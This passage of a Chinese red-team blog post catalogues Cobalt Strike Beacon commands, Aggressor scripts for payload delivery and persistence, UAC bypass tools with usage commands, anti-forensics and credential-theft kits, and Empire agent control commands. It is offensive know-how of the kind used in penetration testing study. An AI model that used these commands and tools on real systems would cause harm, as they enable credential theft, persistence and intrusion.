部署隐蔽VPN客户端</span><br><span class="line">cp				复制文件</span><br><span class="line">dcsync			从DC中提取密码哈希</span><br><span class="line">desktop			桌面查看目标桌面并与之交互</span><br><span class="line">dllinject		将反射DLL注入进程</span><br><span class="line">dllload			使用LoadLibrary（）将DLL加载到进程中</span><br><span class="line">download		下载文件</span><br><span class="line">downloads		列出正在进行的文件下载</span><br><span class="line">drives			列出目标驱动器</span><br><span class="line">elevate			提升尝试提升权限</span><br><span class="line">execute			执行目标执行程序（无输出）</span><br><span class="line">execute-assembly	在目标上执行内存中的本地.NET程序</span><br><span class="line">exit			终止Bean会话</span><br><span class="line">getprivs		启用当前令牌的系统权限</span><br><span class="line">getsystem		尝试获取SYSTEM</span><br><span class="line">getuid			获取用户ID</span><br><span class="line">hashdump		转储密码哈希值</span><br><span class="line">help			帮助菜单</span><br><span class="line">inject			在特定进程中注入一个会话</span><br><span class="line">jobkill			杀死一个长期的后期开发任务</span><br><span class="line">jobs			列出长期运行的后期开发任务</span><br><span class="line">kerberos_ccache_use		将缓存中的kerberos票证应用于此会话</span><br><span class="line">kerberos_ticket_purge	从本次会议中清除kerberos门票</span><br><span class="line">kerberos_ticket_use		将kerberos票证应用于此会话</span><br><span class="line">keylogger		键盘记录器将键击记录器注入进程</span><br><span class="line">kill			杀死一个进程</span><br><span class="line">link			通过SMB连接到Beacon对等端</span><br><span class="line">logonpasswords		使用mimikatz转储凭据和哈希值</span><br><span class="line">ls		列出文件</span><br><span class="line">make_token		创建令牌以传递凭据</span><br><span class="line">mimikatz		运行mimikatz命令</span><br><span class="line">mkdir			制作一个目录</span><br><span class="line">mode dns		使用DNS A作为数据通道（仅限DNSBean）</span><br><span class="line">mode dns-txt		使用DNS TXT作为数据通道（仅限DNSBean）</span><br><span class="line">mode dns6		使用DNS AAAA作为数据通道（仅限DNSBean）</span><br><span class="line">mode http			使用HTTP作为数据通道</span><br><span class="line">mode smb		使用SMB对等通信</span><br><span class="line">mv				移动文件</span><br><span class="line">net				网络和主机枚举工具</span><br><span class="line">note			为此Beacon分配注释</span><br><span class="line">persitence		为Bean添加或删除持久性功能</span><br><span class="line">portscan		扫描网络以获取开放服务</span><br><span class="line">powerpick		通过Unmanaged PowerShell执行命令</span><br><span class="line">powershell		通过powershell.exe执行命令</span><br><span class="line">powershell-import	导入powershell脚本</span><br><span class="line">ppid			为生成的post-ex作业设置父PID</span><br><span class="line">ps				显示进程列表</span><br><span class="line">psexec			使用服务在主机上生成会话</span><br><span class="line">psexec_psh		使用PowerShell在主机上生成会话</span><br><span class="line">psinject		在特定进程中执行PowerShell命令</span><br><span class="line">pth				使用Mimikatz传递哈希</span><br><span class="line">pwd				打印当前目录</span><br><span class="line">reg				查询注册表</span><br><span class="line">rename_msbuild		创建无辜的MSBuild.exe副本</span><br><span class="line">rev2self		恢复原始令牌</span><br><span class="line">rm				删除文件或文件夹</span><br><span class="line">rportfwd		向前设置反向端口</span><br><span class="line">run				在目标上执行程序（返回输出）</span><br><span class="line">runas			以另一个用户身份执行程序</span><br><span class="line">runasadmin		在高完整性上下文中执行程序</span><br><span class="line">runu				在另一个PID下执行程序</span><br><span class="line">screenshot		截取屏幕截图</span><br><span class="line">sendtoempire	将当前Beacon会话发送到已配置的Empire服务器</span><br><span class="line">setenv			设置环境变量</span><br><span class="line">shell			通过cmd.exe执行命令</span><br><span class="line">shinject		将shellcode注入进程</span><br><span class="line">shspawn			生成进程并将shellcode注入其中</span><br><span class="line">sleep			设置Bean睡眠时间</span><br><span class="line">socks			启动SOCKS4a服务器以中继流量</span><br><span class="line">socks stop		停止SOCKS4a服务器</span><br><span class="line">spawn			产生一个会话</span><br><span class="line">spawnto			设置可执行文件以生成进程</span><br><span class="line">spawnu			在另一个PID下产生一个会话</span><br><span class="line">ssh				使用SSH在主机上生成SSH会话</span><br><span class="line">ssh-key			使用SSH在主机上生成SSH会话</span><br><span class="line">steal_token		从进程中窃取访问令牌</span><br><span class="line">timestomp		将时间戳从一个文件应用到另一个文件</span><br><span class="line">type			显示文件的内容</span><br><span class="line">unlink			断开与父Beacon的连接</span><br><span class="line">upload			上传文件</span><br><span class="line">wimgest			使用mimikatz转储明文凭据</span><br><span class="line">winrm			使用WinRM在主机上生成会话</span><br><span class="line">wmi				使用WMI在主机上生成会话</span><br><span class="line">wmi_msbuild 	wmi横向运动没有powershell</span><br></pre></td></tr></table></figure>
<h4 id="一些好用的脚本"><a href="#一些好用的脚本" class="headerlink" title="一些好用的脚本"></a>一些好用的脚本</h4><blockquote>
<p>后续有时间再整理整理。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">CertUtilWebDelivery.cna  </span><br><span class="line">Logging                       </span><br><span class="line">PowerLessShell        </span><br><span class="line">ProcessMonitor.ps1  </span><br><span class="line">SMBPayloadGenerator.cna</span><br><span class="line">ArtifactPayloadGenerator.cna </span><br><span class="line">DriverSearcher           </span><br><span class="line">logvis.cna                    </span><br><span class="line">PowerView3-Aggressor  </span><br><span class="line">UACBypass</span><br><span class="line">AVQuery.cna                   </span><br><span class="line">EDR.cna                  </span><br><span class="line">Persistence                   </span><br><span class="line">ProcessColor.cna     </span><br><span class="line">RedTeamRepo.cna     </span><br><span class="line">Beaconpire                    </span><br><span class="line">ElevateKit               </span><br><span class="line">persistence-aggressor-script  </span><br><span class="line">ProcessMonitor.cna    </span><br><span class="line">silver-tickets.cna</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/4WR9tTEc46Wr.png?imageslim" alt="mark"></p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/0nCBot3LSOtW.png?imageslim" alt="mark"></p>
<ul>
<li><p>ArtifactPayloadGenerator.cna</p>
<ul>
<li>根据HTTP/HTTPS侦听器生成每种类型的无阶段/分阶段 Payload</li>
<li>创建/opt /cobaltstrike/Staged_Payloads，/opt/cobaltstrike/Stageless_Payloads</li>
</ul>
</li>
<li><p>AVQuery.cna</p>
<ul>
<li>使用PowerShell在目标上查询所有安装的AV，以查询注册表</li>
<li>快速简便地获取您作为攻击者处理的AV</li>
</ul>
</li>
<li><p>CertUtilWebDelivery.cna</p>
<ul>
<li>使用CertUtil.exe的无级Web传送</li>
<li>Powerpick用于生成certutil.exe以下载目标上的无阶段 Payload并使用rundll32.exe执行</li>
</ul>
<p><a href="https://user-images.githubusercontent.com/27856212/29992549-12d45854-8f6c-11e7-95c7-c2892582f56f.PNG" target="_blank" rel="noopener"><img src="https://user-images.githubusercontent.com/27856212/29992549-12d45854-8f6c-11e7-95c7-c2892582f56f.PNG" alt="certutil2"></a></p>
</li>
<li><p>RedTeamRepo.cna</p>
<ul>
<li>一个常见的操作系统命令集合，以及当您手头没有Google或RTFM时的红色团队提示。</li>
</ul>
</li>
<li><p>ProcessColor.cna</p>
<ul>
<li>彩色输出</li>
</ul>
</li>
</ul>
<h4 id="Red-Team-Persistence"><a href="#Red-Team-Persistence" class="headerlink" title="Red Team Persistence"></a><strong>Red Team Persistence</strong></h4><ul>
<li><p>UserSchtasksPersist.cna</p>
<ul>
<li>用户Schtasks作为所选Bean的当前用户运行的持久性</li>
<li>意味着在初始访问时快速用户级持久性</li>
</ul>
<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449039/2b43a742-411e-11e7-8ac4-f003c8060654.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449039/2b43a742-411e-11e7-8ac4-f003c8060654.PNG" alt="的schtasks"></a></p>
</li>
<li><p>ServiceEXEPersist.cna</p>
<ul>
<li>管理级自定义服务EXE持久性</li>
<li>作为所选Bean的提升用户/ SYSTEM运行</li>
</ul>
<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449045/2e4a13c2-411e-11e7-83e4-2b57babdbbdd.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449045/2e4a13c2-411e-11e7-83e4-2b57babdbbdd.PNG" alt="服务"></a></p>
</li>
<li><p>WMICEventPersist.cna</p>
<ul>
<li>使用WMIC为选定的Bean生成系统级别持久性的自定义WMI事件</li>
<li>语法很重，在使用实时目标之前首先测试</li>
</ul>
<p><a href="https://cloud.githubusercontent.com/assets/27856212/25680015/5eeab692-301d-11e7-8b85-914fe928e426.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/25680015/5eeab692-301d-11e7-8b85-914fe928e426.PNG" alt="wmic4"></a></p>
</li>
<li><p>WMIEventPersist.cna</p>
<ul>
<li>使用PowerShell为选定的Bean生成SYSTEM级别持久性的自定义WMI事件</li>
<li>语法很重，在使用实时目标之前首先测试</li>
</ul>
<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449054/36d33172-411e-11e7-818d-7f0702a40712.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449054/36d33172-411e-11e7-818d-7f0702a40712.PNG" alt="wmipersist1"></a></p>
</li>
<li><p>StartupGPOPersist.cna</p>
<ul>
<li>在psscripts.ini中生成本地GPO条目，以调用.ps1脚本文件以在选定的Bean上保持持久性</li>
<li>以SYSTEM身份回拨</li>
<li>在执行之前首先使用GPO枚举（成功的GroupPolicy目录列表）检查权限</li>
<li>Bean执行将导致winlogon.exe挂起，最终用户无法登录。一旦新的Bean检入注入另一个进程并杀死原始。更新即将推出。</li>
</ul>
<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449031/1ffb0aba-411e-11e7-9138-f23de966ac4b.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449031/1ffb0aba-411e-11e7-9138-f23de966ac4b.PNG" alt="GPO"></a></p>
</li>
<li><p>RegistryPersist.cna</p>
<ul>
<li>根据所选Bean的用户输入创建自定义注册表项，值，类型和 Payload位置</li>
</ul>
<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449228/14f41a48-411f-11e7-8690-3ce3c1541738.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449228/14f41a48-411f-11e7-8690-3ce3c1541738.PNG" alt="注册处"></a></p>
</li>
<li><p>HKCURunKeyPSRegistryPersist.cna</p>
<ul>
<li>在HKCU中创建两个自定义注册表运行密钥条目</li>
<li>Payload是基于HTTP/HTTPS侦听器的base64编码的PowerShell Payload</li>
</ul>
<p><a href="https://user-images.githubusercontent.com/27856212/28122833-5bee8d72-66ed-11e7-8d0b-332f32627c62.png" target="_blank" rel="noopener"><img src="https://user-images.githubusercontent.com/27856212/28122833-5bee8d72-66ed-11e7-8d0b-332f32627c62.png" alt="HKCU"></a></p>
</li>
<li><p>Bitsadmin.cna</p>
<ul>
<li>创建在重新引导时执行的bitsadmin作业</li>
<li>目前适用于Windows 7,8，Server 2008，Server 2012</li>
</ul>
<p><a href="https://user-images.githubusercontent.com/27856212/40030114-f1bb39d2-57a5-11e8-9b99-ea076a852503.png" target="_blank" rel="noopener"><img src="https://user-images.githubusercontent.com/27856212/40030114-f1bb39d2-57a5-11e8-9b99-ea076a852503.png" alt="位"></a></p>
</li>
</ul>
<h4 id="Kits-工具包"><a href="#Kits-工具包" class="headerlink" title="Kits 工具包"></a>Kits 工具包</h4><p>这里的大多数有用的脚本都是用<a href="https://github.com/Und3rf10w/Aggressor-scripts/blob/master/kits" target="_blank" rel="noopener">工具包</a>组织的。您所要做的就是加载<a href="https://github.com/Und3rf10w/Aggressor-scripts/blob/master/kits/KitLoader.cna" target="_blank" rel="noopener">KitLoader.cna</a>脚本，它将自动加载所有其他工具包（execpt DebugKit）。</p>
<ol>
<li><strong>AnnoyKit</strong></li>
</ol>
<p>此套件中的操作围绕杂项乐趣，通常涉及弄乱用户</p>
<ol>
<li><strong>AntiForensicsKit</strong>   </li>
</ol>
<p>该套件中的行动围绕抗辩护理。如果它减慢了调查员的速度，它很可能属于这个套件。我们都知道抗辩法是最好的取证。</p>
<ol>
<li><strong>CredKit</strong>  凭证获取</li>
</ol>
<p>此工具包中的操作围绕凭证窃取，无论是通过内存抓取还是读取文件。如果涉及窃取密码，则应该在此处。</p>
<ol>
<li><strong>DebugKit</strong></li>
</ol>
<p>此工具包仅限于我用于开发和调试的操作，因此不会加载其余部分。</p>
<ol>
<li><strong>EnumKit</strong></li>
</ol>
<p>此工具包中的操作围绕主机和网络枚举。凭证枚举操作应该使用CredKit。</p>
<ol>
<li><strong>PersistKit</strong>  </li>
</ol>
<p>此工具包中的操作围绕端点持久性。示例包括后门服务创建，后门进程创建等</p>
<ol>
<li><strong>PrivEscKit</strong>  提权</li>
</ol>
<p>此工具包中的操作围绕端点权限提升。涉及强制扫描的动作（powerup.ps1，unix-privesc-check）应该放在apporiate部分</p>
<ol>
<li><strong>ThirdParty</strong> 这只是其他人创建的.cna脚本的随机集合，我喜欢使用它们。我只是装载了kitloader以便于传送。可能会对第三方脚本进行更改，以便更好地与我的工作流程集成。</li>
</ol>
<h5 id="NoPowerShell"><a href="#NoPowerShell" class="headerlink" title="NoPowerShell"></a>NoPowerShell</h5><blockquote>
<p><a href="https://github.com/bitsadmin/nopowershell" target="_blank" rel="noopener">https://github.com/bitsadmin/nopowershell</a></p>
</blockquote>
<p>NoPowerShell是一个用C＃实现的工具，它支持执行类似PowerShell的命令，同时对任何PowerShell日志记录机制都不可见。可以在Cobalt Strike中加载此.NET Framework 2兼容二进制文件，以在内存中执行命令。不<code>System.Management.Automation.dll</code>使用; 只有原生的.NET库。</p>
<p>此外，该项目使每个人只需使用几行C＃代码即可轻松扩展其功能。</p>
<h5 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h5><p><a href="https://github.com/tevora-threat/PowerView3-Aggressor" target="_blank" rel="noopener">https://github.com/tevora-threat/PowerView3-Aggressor</a></p>
<h5 id="BloodHound-联动插件"><a href="#BloodHound-联动插件" class="headerlink" title="BloodHound 联动插件"></a>BloodHound 联动插件</h5><p><a href="https://github.com/vysec/ANGRYPUPPY" target="_blank" rel="noopener">https://github.com/vysec/ANGRYPUPPY</a></p>
<h4 id="提权脚本"><a href="#提权脚本" class="headerlink" title="提权脚本"></a>提权脚本</h4><p>UAC Bypass</p>
<blockquote>
<p><a href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts" target="_blank" rel="noopener">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a></p>
</blockquote>
<h5 id="在不调用powershell-exe的情况下运行PowerShell命令"><a href="#在不调用powershell-exe的情况下运行PowerShell命令" class="headerlink" title="在不调用powershell.exe的情况下运行PowerShell命令"></a>在不调用powershell.exe的情况下运行PowerShell命令</h5><blockquote>
<p><a href="https://github.com/Mr-Un1k0d3r/PowerLessShell" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/PowerLessShell</a></p>
</blockquote>
<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><blockquote>
<p><a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener">https://github.com/rsmudge/ElevateKit</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ms15-051</span><br><span class="line">ms16-016</span><br><span class="line">ms16-032：辅助登录句柄权限提升（CVE-2016-099）</span><br><span class="line">uac-eventvwr</span><br><span class="line">uac-wscript</span><br></pre></td></tr></table></figure>
<h4 id="UACME-BypassUAC的总结"><a href="#UACME-BypassUAC的总结" class="headerlink" title="UACME  BypassUAC的总结"></a>UACME  BypassUAC的总结</h4><blockquote>
<p><a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME</a></p>
<p><a href="http://www.freebuf.com/author/alphalab" target="_blank" rel="noopener">alphalab</a>  总结：白名单绕过UAC方法原理介绍 <a href="https://www.freebuf.com/vuls/183914.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/183914.html</a></p>
<p><a href="https://www.v2ex.com/t/358133?p=1" target="_blank" rel="noopener">https://www.v2ex.com/t/358133?p=1</a></p>
<p><a href="http://www.fuzzysecurity.com/tutorials/27.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/27.html</a></p>
</blockquote>
<p>基本原理：</p>
<ol>
<li>各类UAC白名单程序的DLL劫持</li>
<li>各类提升权限的COM接口利用</li>
</ol>
<ul>
<li>Akagi 也就是主要的Bin，其中包含了所有的Methods，绕过UAC的主要方法的源码都在Method目录下，会以UAC绕过方法的发现者的名字来命名源文件。</li>
<li>Akatsuki 又叫做“晓”，WOW64 logger绕过UAC的利用方法的DLL源码</li>
<li>Fubuki 又叫做“暴风雪“,好几个绕过UAC利用的代理DLL，他们都共用了劫持Ole32.dll的方法</li>
<li>Hibiki 又叫做“声音”，AVRF方法绕过UAC的利用方法的DLL源码</li>
<li>Ikazuchi 又叫做”雷声“，利用劫持 comctl32.dll 组件绕过UAC的利用方法的DLL源码</li>
<li>Inazuma 又叫做“闪电”，SHIM相关利用的绕过UAC的利用方法的EXE源码</li>
<li>Kamikaze 又叫做“神风”，未在工程文件中引用，MMC劫持方法利用的MSC文件</li>
<li>Kongou 又叫做“金刚”，利用Hybrid方法绕过UAC的Dll，已经排除在新工程中的引用了</li>
<li>Naka 又叫做“空气”，压缩及亦或编码的小工具源码</li>
<li>Yuubari Aka UACView用来查看相关UAC的设定信息，以及扫描存在可利用的程序的工具</li>
</ul>
<h4 id="WinPwnage-Bypass-UAC、权限维持"><a href="#WinPwnage-Bypass-UAC、权限维持" class="headerlink" title="WinPwnage  Bypass UAC、权限维持"></a>WinPwnage  Bypass UAC、权限维持</h4><blockquote>
<p>好用。python写的、py2exe编译exe</p>
<p><a href="https://github.com/rootm0s/WinPwnage" target="_blank" rel="noopener">https://github.com/rootm0s/WinPwnage</a></p>
</blockquote>
<h5 id="UAC绕过"><a href="#UAC绕过" class="headerlink" title="UAC绕过"></a>UAC绕过</h5><ul>
<li>UAC绕道使用fodhelper</li>
<li>UAC绕过使用computerdefaults</li>
<li>UAC绕过使用slui</li>
<li>UAC绕过使用silentcleanup</li>
<li>UAC绕过使用compmgmtlauncher</li>
<li>使用sdclt进行UAC绕过（isolatedcommand）</li>
<li>UAC绕过使用sdclt（App Paths）</li>
<li>UAC绕过使用perfmon</li>
<li>UAC使用eventviewer绕过</li>
<li>使用sysprep进行UAC绕过（支持dll Payload）</li>
<li>UAC绕过使用migwiz（支持dll Payload）</li>
<li>使用mcx2prov进行UAC绕过（支持dll Payload）</li>
<li>使用cliconfg进行UAC绕过（支持dll Payload）</li>
</ul>
<h5 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h5><ul>
<li>使用userinit密钥权限维持</li>
<li>使用图像文件执行选项和放大镜的持久性</li>
<li>使用hkey_local_machine运行键的持久性</li>
<li>使用hkey_current_user运行键的持久性</li>
<li>使用schtask的持久性（SYSTEM权限）</li>
<li>使用资源管理器dll劫持的持久性</li>
<li>使用mofcomp和mof文件的持久性（SYSTEM权限）</li>
<li>使用wmic的持久性（SYSTEM权限）</li>
<li>使用启动文件的持久性</li>
<li>持久性使用Cortana App</li>
<li>使用People App的持久性</li>
</ul>
<p>1、扫描可以提权的uac列表，绿色是可以提权的payload。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  winpwnage.py -scan  -uac</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181203/dER5wL6wIqnI.png?imageslim" alt="mark"></p>
<p>2、扫描可以权限维持的persist列表，绿色是可以提权的payload。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  winpwnage.py -scan  -persist</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181203/fnOHIfb9jyJO.png?imageslim" alt="mark"></p>
<pre><code>python  winpwnage.py    -use  -uac ID号 C:\Windows\System32\cmd.exe
</code></pre><p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181203/lkvggvnySPdd.png?imageslim" alt="mark"></p>
<p>3、弹出管理员cmd.exe</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181203/vC5HeUcUtu5b.png?imageslim" alt="mark"></p>
<h5 id="pupy"><a href="#pupy" class="headerlink" title="pupy"></a>pupy</h5><blockquote>
<p>开源远控</p>
</blockquote>
<p><a href="https://github.com/n1nj4sec/pupy" target="_blank" rel="noopener">https://github.com/n1nj4sec/pupy</a></p>
<h2 id="工具联动"><a href="#工具联动" class="headerlink" title="工具联动"></a>工具联动</h2><h2 id="一些自动化工具"><a href="#一些自动化工具" class="headerlink" title="一些自动化工具"></a>一些自动化工具</h2><h3 id="Death-Star-自动化工具"><a href="#Death-Star-自动化工具" class="headerlink" title="Death Star 自动化工具"></a>Death Star 自动化工具</h3><blockquote>
<p><a href="https://github.com/SadProcessor/EmpireDog" target="_blank" rel="noopener">https://github.com/SadProcessor/EmpireDog</a></p>
<p><a href="https://www.youtube.com/watch?v=iMoFORL2fpQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=iMoFORL2fpQ</a></p>
</blockquote>
<p>基于Empire API，下拉agent，自动的使用Empire Api进行横向渗透、后渗透。</p>
<p>原理是作者博客上的那种图，一些常见的内网域渗透思路。</p>
<p>实验了下，还是挺自动化的。就是遍历一些常见的攻击方式。</p>
<h3 id="EmpireDog"><a href="#EmpireDog" class="headerlink" title="EmpireDog"></a>EmpireDog</h3><blockquote>
<p><a href="https://github.com/SadProcessor/EmpireDog" target="_blank" rel="noopener">https://github.com/SadProcessor/EmpireDog</a></p>
</blockquote>
<p>EmpireDog，是用powershell联动Empire、BloodHound的一套工具。</p>
<p>安装步骤：</p>
<ul>
<li><p>把github上四个文件夹下到 C:\Windows\System32\WindowsPowerShell\v1.0\Modules中。</p>
</li>
<li><p>分布Import-Modules </p>
</li>
<li><p>将CustomCypher.txt内容添加到BH Custom Queries / Map Empire</p>
</li>
</ul>
<blockquote>
<p>Get-Command -Module <em><modulename></modulename></em> | Get-Help -Examples</p>
</blockquote>
<p>基本流程：</p>
<p>Empire–&gt;PowerEmpire–&gt; DogStrike_–&gt;  CypherDog–&gt;BloodHound–&gt;权限</p>
<h4 id="第一步-Empire-API交互"><a href="#第一步-Empire-API交互" class="headerlink" title="第一步 Empire API交互"></a><strong>第一步 Empire API交互</strong></h4><p>PowerEmpire和EmpireStrike可与Empire服务器进行交互</p>
<p>通过帝国API。 PowerEmpire不需要EmpireStrike。 EmpireStrike是PowerEmpire上的一个包装器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./empire --headless --username *user* --password *password*</span><br><span class="line">./empire --rest --username *user* --password *password*</span><br></pre></td></tr></table></figure>
<h5 id="PowerEmpire"><a href="#PowerEmpire" class="headerlink" title="PowerEmpire"></a><strong>PowerEmpire</strong></h5><p>PowerEmpire是一个PowerShell模块，用于与Empire的API进行交互</p>
<p>特征</p>
<ul>
<li>27个与Empire Server交互的Cmdlet</li>
<li>通过会话控制多个服务器</li>
<li>用PowerShell做吧！</li>
</ul>
<p>Credits</p>
<p>PowerEmpire由DarkOperator编写（@Carlos_Perez）</p>
<p>更多信息</p>
<p><a href="https://gitlab.com/carlos_perez/PowerEmpire/wikis/home" target="_blank" rel="noopener">https://gitlab.com/carlos_perez/PowerEmpire/wikis/home</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">＃安装模块</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> UnRestricted</span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> PowerEmpire2.<span class="number">0</span>_DogMod</span><br><span class="line"></span><br><span class="line">＃连接到服务器</span><br><span class="line"></span><br><span class="line">New-EmpireSession    -ComputerName   &lt;IP&gt; -Credential &lt;用户名&gt; -NoSSLCheck</span><br><span class="line">New-EmpireSession    -ComputerName  <span class="number">192.168</span>.<span class="number">10.130</span> -Credential admin  -NoSSLCheck</span><br><span class="line">＃检查命令</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Command</span> -Module PowerEmpire2.<span class="number">0</span>_dogMod</span><br><span class="line"></span><br><span class="line"><span class="comment">#RTFM</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Help</span> *&lt;CommandName&gt;* -Full</span><br></pre></td></tr></table></figure>
<p>注意：</p>
<p>导入EmpireStrike模块也将导入PowerEmpire并要求</p>
<p>初始服务器设置，所以你现在可以跳过这一切</p>
<h5 id="EmpireStrike"><a href="#EmpireStrike" class="headerlink" title="EmpireStrike"></a><strong>EmpireStrike</strong></h5><p>EmpireStrike是PowerEmpire的一个包装器，语法短。</p>
<p>EmpireStrike Cmdlet使用PowerEmpire命令。</p>
<p> 特征</p>
<ul>
<li>17个具有短语法的Cmdlet</li>
<li>Tab-Completion / Dynamic Params</li>
<li>管道输入/多个目标</li>
<li>ISE额外服务</li>
</ul>
<p>安装</p>
<p>导入EmpireStrike还将导入PowerEmpire。</p>
<p>命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#import Module（也导入PowerEmpire2.0_DogMod）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> EmpireStrike2.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Session</span></span><br><span class="line"><span class="comment"># Check Current Session</span></span><br><span class="line">Session ?</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="comment">## Agents</span></span><br><span class="line"><span class="comment"># Check selected agents</span></span><br><span class="line">Agent ?</span><br><span class="line"><span class="comment"># Agent list for current session</span></span><br><span class="line">Agent *</span><br><span class="line"><span class="comment"># Set agent</span></span><br><span class="line">Agent ABCDE123</span><br><span class="line"><span class="comment"># Check selected agent</span></span><br><span class="line">Agent ?</span><br><span class="line"><span class="comment"># More details</span></span><br><span class="line">Agent ??</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Multiple Targets</span></span><br><span class="line">Agent * | CommandX <span class="string">'$env:COMPUTERNAME'</span></span><br><span class="line"><span class="comment"># Get Results</span></span><br><span class="line">Agent * | Result</span><br><span class="line"></span><br><span class="line"><span class="comment">## Modules</span></span><br><span class="line"><span class="comment"># Check selected module</span></span><br><span class="line">Module ?</span><br><span class="line"><span class="comment"># List all Modules</span></span><br><span class="line">Module *</span><br><span class="line"><span class="comment"># Search Module</span></span><br><span class="line">ModuleSearch wallpaper</span><br><span class="line"><span class="comment"># Set Module</span></span><br><span class="line">Module powershell/trollsploit/wallpaper</span><br><span class="line"><span class="comment"># or Combo</span></span><br><span class="line">Module (ModuleSearch wallpaper).name</span><br><span class="line"><span class="comment"># Check options for selected module</span></span><br><span class="line">Option ?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># With description</span></span><br><span class="line">Option *</span><br><span class="line"><span class="comment"># Set option</span></span><br><span class="line">Option LocalImagePath <span class="string">"/root/Pictures/wallpapers/wllppr.jpg"</span></span><br><span class="line"><span class="comment"># Check options</span></span><br><span class="line">Option ?</span><br><span class="line"><span class="comment">## Strike</span></span><br><span class="line"><span class="comment"># 